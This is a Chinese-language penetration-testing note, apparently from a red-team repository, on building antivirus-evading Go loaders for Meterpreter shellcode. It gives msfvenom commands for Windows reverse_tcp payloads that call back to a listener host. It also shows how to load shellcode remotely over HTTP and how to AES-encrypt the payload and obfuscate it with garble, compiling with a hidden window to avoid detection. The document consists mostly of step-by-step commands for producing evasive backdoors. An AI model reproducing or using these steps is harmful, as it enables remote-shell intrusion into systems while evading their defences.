  #### 直接编译
	生成
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f c
	代码转换成0x格式，粘贴到go.txt中保存为go格式
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/97.png)
	
	安装golang环境在shellcode目录执行
	>go build生成exe
  #### 编码编译
  	https://github.com/biggerduck/RedTeamNotes/blob/main/%E5%88%A9%E7%94%A8go%E5%8A%A0%E8%BD%BDshellcode%E5%85%8D%E6%9D%80.pdf
  #### 加载器
  ##### go-shellcode
	https://github.com/brimstone/go-shellcode
	进入cmd/sc目录编译sc.exe
	>go build
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/98.png)

	生成
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f hex -o shell.txt 
	加载器加载shellcode
	>sc.exe shellcode
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/99.png)
  ##### Gsl
	https://raw.githubusercontent.com/TideSec/BypassAntiVirus/master/tools/gsl-sc-loader.zip
	>gsl -s SHELLCODE -hex msf生成hex格式
	>gsl -f shell.raw本地加载raw格式文件
	>gsl -f shell.hex -hex 本地加载hex格式文件
	>gsl -u http://192.168.0.108/1.raw 远程加载
	>gsl -u http://192.168.0.108/1.hex
  ##### go-shellcode-loader
  	https://github.com/HZzz2/go-shellcode-loader
	>git clone https://github.com/HZzz2/go-shellcode-loader.git
	>cd go-shellcode-loader
	//下条命令安装第三方混淆库  GitHub地址：https://github.com/burrowers/garble
	>go install mvdan.cc/garble@latest   
	>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=9999 -f raw > rev.raw
	>base64 -w 0 -i rev.raw > rev.bs64
	>cat rev.bs64
	复制到aes-sc.go中的51行替换payload
	运行aes-sc.go生成AES加密后的值
	>go run aes-sc.go
	复制输出的值到go-sc.go中的73行替换payload
	编译成exe可执行程序
	>garble -tiny -literals -seed=random build -ldflags="-w -s -H windowsgui" -race go-sc.go
	参数解释：
	garble(混淆库)：
	     -tiny                    删除额外信息
	     -literals               混淆文字
	     -seed=random   base64编码的随机种子 
	go：
	    -w                        去掉调试信息，不能gdb调试了
	    -s                         去掉符号表
	    -H windowsgui    隐藏执行窗口，不占用 cmd 终端。 （被查杀率高）
	    -race                    使数据允许竞争检测
	编译后得到go-sc.exe